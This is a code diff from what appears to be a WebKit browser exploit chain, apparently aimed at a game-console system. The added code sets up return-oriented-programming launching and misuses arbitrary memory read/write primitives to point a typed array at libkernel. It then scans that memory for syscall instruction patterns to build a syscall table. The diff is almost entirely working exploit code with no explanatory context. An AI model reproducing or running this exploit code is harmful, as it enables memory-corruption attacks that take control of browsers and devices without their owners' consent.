@@ -129,6 +129,24 @@ try {
       return window.moduleBaseLibc.add32(off);
     }
 
+    // Setup ROP launching
+    var hold1;
+    var hold2;
+    var holdz;
+    var holdz1;
+
+    while (1) {
+      hold1 = {a:0, b:0, c:0, d:0};
+      hold2 = {a:0, b:0, c:0, d:0};
+      holdz1 = p.leakval(hold2);
+      holdz = p.leakval(hold1);
+      if (holdz.low - 0x30 == holdz1.low) break;
+    }
+
+    var pushframe = [];
+    pushframe.length = 0x80;
+    var funcbuf;
+
     var launch_chain = function(chain)
     {
       var stackPointer = 0;
@@ -177,7 +195,41 @@ try {
       return p.leakval(rtv);
     }
 
-        p.loadchain = launch_chain;
+    p.loadchain = launch_chain;
+
+    // Dynamically resolve syscall wrappers from libkernel
+    var kview = new Uint8Array(0x1000);
+    var kstr = p.leakval(kview).add32(0x10);
+    var orig_kview_buf = p.read8(kstr);
+    
+    p.write8(kstr, window.moduleBaseLibKernel);
+    p.write4(kstr.add32(8), 0x40000);
+
+    var countbytes;
+    for (var i=0; i < 0x40000; i++)
+    {
+        if (kview[i] == 0x72 && kview[i+1] == 0x64 && kview[i+2] == 0x6c && kview[i+3] == 0x6f && kview[i+4] == 0x63)
+        {
+            countbytes = i;
+            break;
+        }
+    }
+    p.write4(kstr.add32(8), countbytes + 32);
+    
+    var dview32 = new Uint32Array(1);
+    var dview8 = new Uint8Array(dview32.buffer);
+    for (var i=0; i < countbytes; i++)
+    {
+        if (kview[i] == 0x48 && kview[i+1] == 0xc7 && kview[i+2] == 0xc0 && kview[i+7] == 0x49 && kview[i+8] == 0x89 && kview[i+9] == 0xca && kview[i+10] == 0x0f && kview[i+11] == 0x05)
+        {
+            dview8[0] = kview[i+3];
+            dview8[1] = kview[i+4];
+            dview8[2] = kview[i+5];
+            dview8[3] = kview[i+6];
+            var syscallno = dview32[0];
+            window.syscalls[syscallno] = window.moduleBaseLibKernel.add32(i);
+        }
+    }
 
     // Setup helpful primitives for calling and string operations
     var chain = new window.rop();
@@ -243,6 +295,7 @@ try {
       }
       return str;
     }
+
     var spawnthread = function (chain) {
       var longjmp       = offsetToWebKit(0x1458);
       var createThread  = offsetToWebKit(0x116ED40);
@@ -272,7 +325,6 @@ try {
 
       return thread2;
     }
-    
 
     var run_count = 0;
 
